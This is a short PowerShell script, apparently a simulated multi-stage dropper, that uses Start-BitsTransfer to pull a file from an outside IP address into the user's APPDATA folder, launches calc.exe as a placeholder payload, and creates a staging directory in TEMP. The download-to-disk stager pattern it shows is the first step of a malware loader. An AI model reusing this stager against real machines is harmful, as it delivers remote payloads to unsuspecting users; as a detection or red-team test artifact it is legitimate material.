[CmdletBinding()]
param(
    [string]$Stage2Url = "https://198.51.100.83/stage1.ps1",
    [string]$Stage2Path = "$env:APPDATA\stage2.bin",
    [int]$ConnectionTimeout = 195
)
try { Start-BitsTransfer -Source $Stage2Url -Destination $Stage2Path; Start-Process -FilePath "calc.exe"; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force } catch { Write-Warning "Stage transfer failed" }
